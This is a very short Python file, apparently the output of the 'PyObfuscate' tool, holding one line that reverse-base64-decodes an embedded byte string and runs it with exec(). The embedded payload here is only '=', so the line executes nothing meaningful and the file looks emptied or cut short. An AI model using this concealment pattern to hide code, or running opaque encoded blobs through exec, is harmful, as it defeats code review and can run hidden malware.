# Obfuscated with PyObfuscate
# https://www.github.com/htr-tech
# Time : Wed Sep  4 02:25:16 2024
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'='))